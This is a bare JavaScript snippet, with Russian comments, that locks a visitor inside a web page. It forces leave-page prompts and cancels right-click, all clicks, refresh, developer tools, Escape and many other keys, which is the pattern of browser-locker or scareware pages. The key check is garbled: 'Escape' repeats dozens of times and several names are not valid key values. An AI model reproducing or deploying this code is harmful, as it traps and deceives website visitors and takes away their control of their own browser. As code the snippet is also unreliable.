window.addEventListener('beforeunload', function (e) {
    // Отмена события
    e.preventDefault();
    // Строка, которая будет отображаться в диалоговом окне
    e.returnValue = '';
  });
document.addEventListener('contextmenu', event => event.preventDefault());
document.addEventListener('keydown', event => {
    if (event.key === 'Enter' || event.key === 'Escape' || event.key === 'F1' || event.key === '`' || event.key === 'F2' || event.key === 'F3' || event.key === 'F4' || event.key === 'F5' || event.key === 'F6' || event.key === 'F7' || event.key === 'F8' || event.key === 'F9' || event.key === 'F10' || event.key === 'F11' || event.key === 'F12' || event.key === 'PgDn' || event.key === 'Win' || event.key === 'Shift' || event.key === 'up' || event.key === 'down' || event.key === 'left' || event.key === 'right' || event.key === 'delete' || event.key === '1' || event.key === '2' || event.key === '3' || event.key === '4' || event.key === '5' || event.key === '6' || event.key === '7' || event.key === '8' || event.key === '9' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape' || event.key === 'Escape') {
      event.preventDefault();
    }
  });
document.addEventListener('click', event => event.preventDefault());
window.addEventListener('beforeunload', function (e) {
    e.preventDefault();
    e.returnValue = '';
  });